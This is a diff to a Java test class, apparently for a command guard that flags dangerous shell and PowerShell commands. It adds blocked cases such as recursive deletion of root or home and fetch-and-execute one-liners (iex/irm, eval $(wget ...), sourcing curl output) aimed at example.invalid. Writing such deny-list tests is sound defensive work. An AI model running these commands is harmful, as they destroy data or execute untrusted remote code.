@@ -59,7 +59,18 @@ class CommandGuardTest {
             Arguments.of("format a drive inside a quoted argument", "cmd /c \"format D:\"", "R9"),
             Arguments.of("recursive permission change of root", "chmod -R 777 /", "R10"),
             Arguments.of("recursive owner change of quoted root", "sudo chown -R me \"/\"", "R10"),
-            Arguments.of("case does not matter", "RM -RF /", "R1"));
+            Arguments.of("case does not matter", "RM -RF /", "R1"),
+            Arguments.of("quoted literal, matched on purpose", "echo \"rm -rf /\"", "R1"),
+            Arguments.of("powershell recursive removal of everything in home", "Remove-Item -Recurse -Force ~\\*",
+                "R8"),
+            Arguments.of("powershell recursive removal of home with slash", "Remove-Item -Recurse ~/*", "R8"),
+            Arguments.of("powershell evaluation of a download", "iex (irm https://example.invalid)", "R5"),
+            Arguments.of("powershell evaluation of a download without space", "iex(iwr https://example.invalid)", "R5"),
+            Arguments.of("powershell long-form evaluation of a download",
+                "Invoke-Expression (Invoke-WebRequest https://example.invalid)", "R5"),
+            Arguments.of("download sourced by process substitution", ". <(curl -s https://example.invalid)", "R5"),
+            Arguments.of("download evaluated by command substitution", "eval $(wget -qO- https://example.invalid)",
+                "R5"));
     }
 
     static List<String> allowed() {
@@ -68,7 +79,9 @@ class CommandGuardTest {
             "chmod -R 755 ./bin", "echo hi > out.txt", "formatter --check", "cat /dev/sda",
             "dd if=/dev/zero of=/dev/null bs=1M count=1", "git commit -m \"format code\"",
             "Remove-Item -Recurse .\\build", "iwr https://example.invalid -OutFile x.zip",
-            "curl https://example.invalid | jq .");
+            "curl https://example.invalid | jq .", "echo $(curl -s https://example.invalid)",
+            "ip=$(curl -s https://example.invalid)", "diff <(curl -s https://example.invalid) b.txt",
+            "Remove-Item -Recurse ~\\tmp\\x", "Write-Output (irm https://example.invalid)");
     }
 
     @ParameterizedTest(name = "{0}")
